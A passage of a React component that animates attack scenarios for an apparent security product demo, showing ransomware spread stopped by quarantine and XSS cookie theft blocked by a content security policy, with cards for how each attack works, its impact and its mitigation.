                {/* RIGHT: BANKING GATEWAY */}
                <div className={`relative z-10 p-3 rounded-2xl border transition-all text-center space-y-1 ${
                  shieldActive ? 'bg-slate-900 border-emerald-500/40 text-emerald-300' : 'bg-rose-950 border-rose-500 text-rose-300'
                }`}>
                  <div className="w-10 h-10 rounded-xl bg-black/40 text-emerald-400 flex items-center justify-center mx-auto">
                    <Server className="w-5 h-5" />
                  </div>
                  <div className="text-[11px] font-mono font-bold">Banking Server</div>
                  <div className="text-[9px] font-mono">
                    {shieldActive ? '✓ Verified $500' : '⚠️ Charged $5000!'}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* =========================================================================
              5. RANSOMWARE LATERAL WORM VISUALIZER
              ========================================================================= */}
          {selectedAttackId === 'ransomware' && (
            <div className="space-y-6">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-rose-400 font-bold">AUTOMATED ZERO-TRUST MICRO-SEGMENTATION</span>
                <span className={shieldActive ? 'text-blue-300 font-bold' : 'text-rose-400 font-bold'}>
                  {shieldActive ? '✓ Patient 0 Quarantined Instantly' : '⚠️ Entire Subnet Encrypted (.locked)'}
                </span>
              </div>

              {/* Grid Node Graph */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 py-4">
                {ransomwareNodes.map((node) => (
                  <div
                    key={node.id}
                    className={`p-4 rounded-2xl border text-center space-y-2 transition-all duration-300 ${
                      node.infected
                        ? (node.isolated
                            ? 'bg-blue-950/80 border-blue-500 text-blue-300 ring-4 ring-blue-500/30'
                            : 'bg-rose-950/80 border-rose-500 text-rose-300 ring-4 ring-rose-500/30 animate-pulse')
                        : 'bg-slate-900 border-emerald-500/40 text-emerald-300'
                    }`}
                  >
                    <div className="w-10 h-10 rounded-xl bg-black/40 flex items-center justify-center mx-auto">
                      {node.infected ? <Lock className="w-5 h-5 text-rose-400" /> : <HardDrive className="w-5 h-5 text-emerald-400" />}
                    </div>
                    <div className="text-xs font-mono font-bold">{node.name}</div>
                    <div className={`text-[10px] font-mono px-2 py-0.5 rounded font-bold ${
                      node.infected
                        ? (node.isolated ? 'bg-blue-900 text-blue-300' : 'bg-rose-900 text-white')
                        : 'bg-emerald-950 text-emerald-400'
                    }`}>
                      {node.infected ? (node.isolated ? 'QUARANTINED' : 'ENCRYPTED .LOCKED') : 'HEALTHY & SAFE'}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* =========================================================================
              6. CROSS-SITE SCRIPTING (XSS) VISUALIZER
              ========================================================================= */}
          {selectedAttackId === 'xss' && (
            <div className="space-y-6">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-sky-400 font-bold">CONTENT SECURITY POLICY (CSP) &amp; DOM SANITIZATION</span>
                <span className={shieldActive ? 'text-blue-300 font-bold' : 'text-rose-400 font-bold'}>
                  {shieldActive ? '✓ Inline Script Execution Refused' : '⚠️ Cookie Exfiltrated to External Gateway'}
                </span>
              </div>

              {/* XSS Stage */}
              <div className="relative h-64 w-full bg-slate-950/80 rounded-2xl border border-slate-800 overflow-hidden flex items-center justify-between px-6 sm:px-12">
                <svg className="absolute inset-0 w-full h-full pointer-events-none">
                  <line x1="15%" y1="50%" x2="50%" y2="50%" stroke="#0284c7" strokeWidth="2" strokeDasharray="4 4" opacity="0.6" />
                  <line x1="50%" y1="50%" x2="85%" y2="50%" stroke={shieldActive ? '#3b82f6' : '#e11d48'} strokeWidth="2" strokeDasharray="4 4" opacity="0.6" />
                </svg>

                {/* Moving script packet */}
                {isPlaying && (
                  <div
                    className={`absolute px-2 py-0.5 rounded text-white font-mono text-[9px] font-bold shadow-lg ${
                      shieldActive ? 'bg-blue-600' : 'bg-rose-600'
                    }`}
                    style={{
                      left: shieldActive
                        ? `${50 + (xssProgress % 20) * 0.8}%`
                        : `${50 + (xssProgress % 38) * 0.95}%`,
                      top: '47%',
                      opacity: shieldActive && (xssProgress % 20) > 15 ? 0 : 1
                    }}
                  >
                    {shieldActive ? '🛡️ CSP Blocked' : 'document.cookie'}
                  </div>
                )}

                {/* LEFT: COMMENT FORM */}
                <div className="relative z-10 p-3 rounded-2xl bg-slate-900 border border-sky-500/40 text-center space-y-1">
                  <div className="w-10 h-10 rounded-xl bg-sky-950 text-sky-400 flex items-center justify-center mx-auto">
                    <Code className="w-5 h-5" />
                  </div>
                  <div className="text-[11px] font-mono font-bold text-sky-300">Comment Form</div>
                  <div className="text-[9px] text-slate-400 font-mono">&lt;script&gt;</div>
                </div>

                {/* MIDDLE: VICTIM BROWSER DOM */}
                <div className={`relative z-10 p-4 rounded-3xl border-2 transition-all duration-300 text-center ${
                  shieldActive
                    ? 'bg-blue-950/80 border-blue-400 ring-8 ring-blue-500/20 text-blue-300 shadow-xl'
                    : 'bg-slate-900 border-rose-500 text-rose-300'
                }`}>
                  <Globe className="w-8 h-8 mx-auto mb-1" />
                  <div className="text-xs font-mono font-bold">Victim Browser</div>
                  <div className="text-[10px] font-mono mt-1 px-2 py-0.5 rounded bg-black/40">
                    {shieldActive ? 'CSP: script-src self' : 'Script Executing!'}
                  </div>
                </div>

                {/* RIGHT: ATTACKER LISTENER */}
                <div className={`relative z-10 p-3 rounded-2xl border transition-all text-center space-y-1 ${
                  shieldActive ? 'bg-slate-900/60 border-slate-700 opacity-40 text-slate-500' : 'bg-rose-950 border-rose-500 text-rose-300 animate-pulse'
                }`}>
                  <div className="w-10 h-10 rounded-xl bg-black/40 text-rose-400 flex items-center justify-center mx-auto">
                    <Bot className="w-5 h-5" />
                  </div>
                  <div className="text-[11px] font-mono font-bold">Attacker Listener</div>
                  <div className="text-[9px] font-mono">
                    {shieldActive ? '0 Cookies Stolen' : 'Session Token Exfiltrated!'}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Real-Time Telemetry Bar at bottom of canvas */}
          <div className="pt-4 mt-4 border-t border-slate-800/80 flex flex-wrap items-center justify-between text-xs font-mono text-slate-400">
            <span>Adaptive Engine: <strong className="text-blue-400">Continuous Evaluation</strong></span>
            <span>Active Status: <strong className={shieldActive ? 'text-emerald-400' : 'text-rose-400'}>
              {shieldActive ? 'DEFENSE ENFORCING' : 'FIREWALL BYPASSED'}
            </strong></span>
          </div>
        </div>

        {/* Technical Breakdown Cards (How it Works, Real-World Impact, Mitigation) */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 pt-2 text-xs">
          <div className="p-5 rounded-2xl bg-slate-50 border border-slate-200/80 space-y-2">
            <h4 className="font-bold text-gray-900 flex items-center gap-1.5 text-sm">
              <Sparkles className="w-4 h-4 text-blue-600" /> How The Attack Works
            </h4>
            <ul className="space-y-1.5 text-gray-600 pl-4 list-disc leading-relaxed">
              {activeAttack.howItWorks.map((step, i) => (
                <li key={i}>{step}</li>
              ))}
            </ul>
          </div>

          <div className="p-5 rounded-2xl bg-rose-50/50 border border-rose-200 space-y-2">
            <h4 className="font-bold text-rose-900 flex items-center gap-1.5 text-sm">
              <ShieldAlert className="w-4 h-4 text-rose-600" /> Real-World Impact
            </h4>
            <p className="text-gray-700 leading-relaxed">{activeAttack.realWorldImpact}</p>
            <div className="pt-2 text-[11px] font-mono text-rose-800">
              <strong>Ref:</strong> {activeAttack.cveExample}
            </div>
          </div>

          <div className="p-5 rounded-2xl bg-blue-50/50 border border-blue-200 space-y-2">
            <h4 className="font-bold text-blue-900 flex items-center gap-1.5 text-sm">
              <ShieldCheck className="w-4 h-4 text-blue-600" /> AdaptiveShield Mitigation
            </h4>
            <p className="text-gray-700 leading-relaxed">{activeAttack.mitigation}</p>
            <div className="pt-2 text-[11px] font-mono text-blue-700 font-semibold">
              ✓ Automated 5-Stage Policy Enforced
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
